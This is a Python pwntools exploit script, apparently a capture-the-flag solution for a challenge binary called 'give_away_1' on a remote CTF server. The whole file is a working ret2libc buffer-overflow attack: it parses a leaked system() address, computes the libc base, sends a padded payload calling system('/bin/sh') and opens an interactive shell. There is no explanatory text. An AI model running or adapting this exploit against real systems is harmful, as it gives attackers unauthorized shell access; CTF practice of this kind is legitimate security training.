from pwn import *



def main():

    local = 0

    if local:
        p = process('./give_away_1')
        SYSTEM = 0x00042660
        BIN_SH = 0x17ff68
    else:
        p = remote("sharkyctf.xyz", 20334)
        SYSTEM = 0x0003d200
        BIN_SH = 0x17e0cf



    out = p.recvline().strip().split(' ')
    #print(out)
    sysaddr = int(out[2],16)

    libc_base = sysaddr - SYSTEM
    BIN_SH_final = BIN_SH + libc_base

    log.info("libc base %s" % hex(libc_base))
    log.info("system address %s" % hex(sysaddr))
    log.info("/bin/sh %s" % hex(BIN_SH_final))


    payload = "A" * 36 + p32(sysaddr) + "B"*4  + p32( BIN_SH_final)  # "B"* 4 it's for stack alignement  
    p.sendline(payload)
    p.interactive()
    p.close()

if __name__ == "__main__":
    main()

